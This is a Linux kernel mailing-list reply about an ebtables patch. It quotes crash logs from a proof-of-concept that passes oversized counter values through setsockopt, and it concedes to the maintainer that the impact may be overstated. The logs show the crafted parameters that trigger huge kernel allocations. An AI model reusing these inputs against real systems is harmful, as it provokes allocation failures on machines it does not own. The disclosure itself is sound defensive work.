> > [    1.580438] RAX: ffffffffffffffda RBX: 00007ffd9e4c8f50 RCX: 0000000=
00043523e
> > [    1.580447] RDX: 0000000000000081 RSI: 0000000000000000 RDI: 0000000=
000000003
> > [    1.580454] RBP: 00007ffd9e4cafd7 R08: 000000007ffffff8 R09: 0000000=
000000000
> > [    1.580461] R10: 00007ffd9e4c8f50 R11: 0000000000000246 R12: 0000000=
000000003
> > [    1.580469] R13: 00007ffd9e4c9278 R14: 00000000004de808 R15: 0000000=
000000001
> > [    1.580500]  </TASK>
> > [worker] setsockopt(name=3Dbogus, len=3D2147483640, num_counters=3D1342=
17720) -> ret=3D-1 errno=3D12 (Cannot allocate memory)
> > EXIT 1
> >
> > EBT_SO_SET_ENTRIES path:
> > [    8.275233] poc: vmalloc error: size 2147483520, exceeds total pages=
, mode:0xcc0(GFP_KERNEL), nodemask=3D(null),cpuset=3D/,mems_allowed=3D0
> > [    8.297875] CPU: 1 UID: 0 PID: 62 Comm: poc Not tainted 7.2.0-rc4-00=
390-g743916aa8e8c #4 PREEMPT(lazy)
> > [    8.297957] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, a=
rch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
> > [    8.298283] Call Trace:
> > [    8.298471]  <TASK>
> > [    8.298471]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:12=
0)
> > [    8.298471]  warn_alloc (mm/page_alloc.c:4023)
> > [    8.298471]  ? alloc_pages_bulk_noprof (mm/page_alloc.c:5338 mm/page=
_alloc.c:5230)
> > [    8.298471]  __vmalloc_node_range_noprof (mm/vmalloc.c:4019)
> > [    8.298471]  ? do_replace_finish (net/bridge/netfilter/ebtables.c:10=
24 (discriminator 2))
> > [    8.298471]  ? __vmalloc_node_range_noprof (mm/vmalloc.c:694 mm/vmal=
loc.c:703 mm/vmalloc.c:3924 mm/vmalloc.c:4082)
> > [    8.298471]  __vmalloc_node_noprof (mm/vmalloc.c:4143 (discriminator=
 4))
> > [    8.298471]  ? do_replace_finish (net/bridge/netfilter/ebtables.c:10=
24 (discriminator 2))
> > [    8.298471]  do_replace_finish (net/bridge/netfilter/ebtables.c:1024=
 (discriminator 2))
> > [    8.298471]  ? do_replace (net/bridge/netfilter/ebtables.c:1145 (dis=
criminator 2))
> > [    8.298471]  do_replace (net/bridge/netfilter/ebtables.c:1156)
> > [    8.298471]  nf_setsockopt (net/netfilter/nf_sockopt.c:101)
> > [    8.298471]  do_sock_setsockopt (net/socket.c:2368)
> > [    8.298471]  __sys_setsockopt (net/socket.c:2393)
> > [    8.298471]  __x64_sys_setsockopt (net/socket.c:2399 net/socket.c:23=
96 net/socket.c:2396)
> > [    8.298471]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/=
entry/syscall_64.c:94)
> > [    8.298471]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64=
.S:121)
> > [    8.298471] RIP: 0033:0x4307be
> > [    8.298471] Code: ff ff ff f7 d8 64 89 02 b8 ff ff ff ff c3 66 2e 0f=
 1f 84 00 00 00 00 00 0f 1f 40 00 f3 0f 1e fa 49 89 ca b8 36 00 00 00 0f 05=
 <48> 3d 00 f0 ff ff 77 0a c3 66 0f 1f 84 00 00 00 00 00 48 c7 c2 b8
> > [    8.298471] RSP: 002b:00007ffc525761e8 EFLAGS: 00000246 ORIG_RAX: 00=
00000000000036
> > [    8.298471] RAX: ffffffffffffffda RBX: 00000000031ae378 RCX: 0000000=
0004307be
> > [    8.298471] RDX: 0000000000000080 RSI: 0000000000000000 RDI: 0000000=
000000003
> > [    8.298471] RBP: 00007ffc52576280 R08: 0000000000000079 R09: 0000000=
000000000
> > [    8.298471] R10: 00007ffc52576280 R11: 0000000000000246 R12: 0000000=
000000003
> > [    8.298471] R13: 00007ffc52577fd7 R14: 00000000004de808 R15: 0000000=
000000001
> > [    8.298471]  </TASK>
> > [worker] SET_ENTRIES name=3Dbogus len=3D121 entries_size=3D1 num_counte=
rs=3D134217720 allocation=3D2147483520 -> ret=3D-1 errno=3D12 (Cannot alloc=
ate memory)
> > EXIT 1
> > -----END crash log-----
> >
> > Best regards,
> > Zihan Xi
> >
> > Zihan Xi (1):
> >   netfilter: ebtables: avoid unbounded counter allocations
> >
> >  net/bridge/netfilter/ebtables.c | 34 ++++++++++++++++-----------------
> >  1 file changed, 17 insertions(+), 17 deletions(-)
> >
> > --
> > 2.43.0

Hi Pablo,

Thanks, that is a fair point.

Our concern was that invalid EBT_SO_SET_COUNTERS / EBT_SO_SET_ENTRIES
requests can trigger a large temporary counter allocation before the
kernel looks up the target table and checks the requested counter count
against the table's actual nentries value.

That said, you are right that a privileged user may already be able to
request large allocations through a sufficiently large, well-formed
ebtables table, and by itself this only results in a large allocation
attempt.

So our original report may have overstated the practical impact. From
your perspective, would you consider this primarily an undesirable
validation-order issue, or do you think it is still worth fixing
upstream?

Thanks for the clarification.

Best regards,
Zihan Xi
